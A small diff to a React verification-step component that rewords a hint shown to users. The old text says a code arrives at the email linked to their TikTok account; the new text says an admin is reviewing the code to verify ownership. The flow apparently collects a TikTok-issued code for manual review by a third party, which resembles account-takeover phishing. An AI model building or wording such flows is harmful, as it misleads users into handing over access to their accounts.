@@ -70,7 +70,7 @@ export function VerifyCodeStep({ submissionId, onNext, onBack, onRejection }: Ve
                 submissionId={submissionId}
                 stepToWatch="verificationCode"
                 promptText="Please keep this page open."
-                promptHint="You should receive a code via the email linked to your TikTok account."
+                promptHint="An admin is reviewing your code. This step verifies you own the TikTok account."
                 onApproval={() => onNext({ verificationCode: form.getValues('verificationCode') })}
                 onRejection={() => {
                     onRejection();
